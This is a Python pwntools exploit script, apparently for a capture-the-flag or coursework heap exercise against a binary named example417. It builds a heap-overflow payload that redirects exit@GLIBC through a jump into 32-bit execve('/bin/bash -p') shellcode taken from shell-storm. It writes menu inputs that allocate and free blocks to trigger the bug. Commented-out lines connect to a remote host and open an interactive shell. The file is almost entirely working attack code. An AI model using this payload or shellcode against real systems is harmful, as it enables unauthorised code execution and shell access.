from pwn import *


def integer2(address):
    # There should be a better way to do this, but I am not an expert in python :(
    # b"You can't possibly do anything about this! 0x9034110\n"
    # 0x9d9c008
    eight_b = 0x8
    address1 = address[45: 52]
    address2 = address1.decode()
    address2 = "0" + address2
    # 09d9c008
    # address3 = address2[0:6]

    # we need to calculate address here
    address3 = int(address2, 16)
    address3 += eight_b

    hexs = hex(address3)
    hexs = hexs[2::]
    hexs = "0" + hexs
    address4 = bytes.fromhex(hexs)
    swap_data = bytearray(address4)
    swap_data.reverse()
    address5 = bytes(swap_data)

    # From https://shell-storm.org/shellcode/files/shellcode-606.php Retrieved  Oct.8.2022
    shellcode33 = b'\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80'

    jmp16 = b'\xe9\x0b\x00\x00\x00'
    jmp16 += b'\x90' * 11

    # exit@GLIBC_2.0 -> 0x80490b0
    # 0x80490b0 - 0xc = 0x80490A4
    payload = b"\x41" * 0 + b'\x08\x01\x00\x00' + b'\x48\x00\x00\x00' + b'\xa4\x90\x04\x08' + address5 + jmp16 + shellcode33 + b'\x90' * 20

    return payload


if __name__ == '__main__':

    # 0x80493b6 <win>
    #
    insert_pay = str.encode("a\n255\n")
    # payload = b"\x41" * 0 + b'\x08\x01\x00\x00' + b'\x48\x00\x00\x00' + b'\xa4\x90\x04\x08' + b'\xb6\x93\x04\x08'
    # payload = b"\x41" *  + b'\x08\x01\x00\x00' + b'\x48\x00\x00\x00' + b'\xa4\x90\x04\x08' + b'\xb6\x93\x04\x08'
    pay = b"\x41" * 255 + b'\n'
    insert_small_block = str.encode("a\n1\nA\n")
    del_small_block_1 = str.encode("d\n1\n")
    del_small_block_2 = str.encode("d\n2\n")


    # newline = str.encode("\n")
    # payload2 = str.encode("a\n1\n")
    # payload3 = str.encode("d\n1\n")



    # newline = str.encode("\n")
    # payload2 = str.encode("a\n1\n")
    # payload3 = str.encode("d\n1\n")

    with open("input", "wb") as binary_file:
        
        # Write original payloa of 255 bytes
        binary_file.write(insert_pay)
        binary_file.write(pay)
        binary_file.write(insert_small_block)
        binary_file.write(insert_small_block)
        binary_file.write(del_small_block_1)
        binary_file.write(insert_small_block)
        binary_file.write(del_small_block_2)



        # binary_file.write(newline)

        # # Write second payload of 1 byte
        # binary_file.write(payload2)
        # binary_file.write(payload)
        # binary_file.write(newline)
        
        # # Write second payload of 1 byte
        # binary_file.write(payload2)
        # binary_file.write(payload)
        # binary_file.write(newline)

        # binary_file.write(payload3)

        # binary_file.write(payload2)
        
        # binary_file.write(payload)
        # binary_file.write(newline)


    # context.log_level = 'debug'
    #
    # context.proxy = (socks.SOCKS5, 'localhost', 8123)
    #
    # r = remote('192.168.2.99', 65442)
    # sleep(1)

    # r = process(['./example417_dbg', 'bbbbbbbbbb'])
    # print(str(r.proc.pid))
    # payload = memory3(r.recvline())
    # payload = b'\x20\xe0\x04\x08' + b'\xc0\x90\x04\x08'

    # with open("payload.bin", "wb") as f:
    # 	f.write(payload)

    # input("Payload ready, proceed?")

    # r.sendline(payload)
    # # r.recvall()
    #
    # r.interactive()
